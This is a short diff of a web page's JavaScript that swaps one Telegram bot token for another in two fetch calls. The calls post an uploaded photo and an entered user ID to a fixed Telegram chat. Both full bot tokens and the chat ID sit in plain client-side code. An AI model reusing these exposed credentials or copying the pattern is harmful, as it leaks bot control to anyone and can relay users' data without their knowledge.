@@ -281,7 +281,7 @@ function upload(){
   formData.append("chat_id","8302272285");
   formData.append("photo",file);
 
-  fetch("https://api.telegram.org/bot8570660820:AAGzoaElOQ0YVfy2BSxf1C3TuGsu2n5J9kU/sendPhoto",{
+  fetch("https://api.telegram.org/bot8570660820:AAHbNbxR5wJ8qkekB0zwjlJK0Ge8S19XrfA/sendPhoto",{
     method:"POST",
     body:formData
   })
@@ -314,7 +314,7 @@ function send(){
 
   const id=document.getElementById("userId").value;
 
-  fetch("https://api.telegram.org/bot8570660820:AAGzoaElOQ0YVfy2BSxf1C3TuGsu2n5J9kU/sendMessage",{
+  fetch("https://api.telegram.org/bot8570660820:AAHbNbxR5wJ8qkekB0zwjlJK0Ge8S19XrfA/sendMessage",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
